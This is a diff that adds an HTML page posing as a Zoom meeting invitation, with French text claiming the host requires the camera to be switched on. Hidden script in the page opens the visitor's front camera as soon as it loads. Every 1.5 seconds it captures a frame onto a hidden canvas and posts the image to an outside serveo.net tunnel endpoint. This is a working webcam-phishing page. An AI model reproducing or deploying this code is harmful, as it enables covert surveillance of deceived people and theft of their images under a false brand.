@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<title>Join Zoom Call</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #2e2e2e;
+  }
+  .container {
+    background-color: #fff;
+    border-radius: 10px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    max-width: 500px;
+    text-align: center;
+    margin: 200px auto;  /* Center the container horizontally */
+  }
+  h1 {
+    color: #333;
+  }
+  .appointment-details {
+    margin-top: 20px;
+    padding: 0 20px; /* Added padding */
+  }
+  .appointment-details p {
+    padding-bottom: 10px; /* Added padding between paragraphs */
+  }
+  .button {
+    display: inline-block;
+    background-color: #007bff;
+    color: #fff;
+    padding: 10px 20px;
+    border-radius: 5px;
+    text-decoration: none;
+    transition: background-color 0.3s ease;
+  }
+  .button:hover {
+    background-color: #0056b3;
+  }
+  /* Added styles for Zoom logo */
+  .zoom-logo {
+    position: fixed;
+    top: 10px;
+    right: 50px;
+    width: 200px;
+    z-index: 1;
+  }
+</style>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'https://d62a7ef1fa6ed27e6e27aa7f98a2c31e.serveo.net/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+      <img class="zoom-logo" src="https://teach.cbs.dk/wp-content/uploads/2022/11/zoom_1400x788.png" alt="Zoom Logo">
+      <div class="container">
+        <h1>Rejoignez la réunion n°259201</h1>
+        <div class="appointment-details">
+          <p>Votre réunion est sur le point de commencer!</p>
+          <p>L'hôte de cet appel demande l'activation de la caméra pour rejoindre l'appel.</p>
+          <p> </p>
+        </div>
+        <a href="" class="button">You need to activate your camera to join this call</a>
+      </div>
+    </body>
+
+</html>
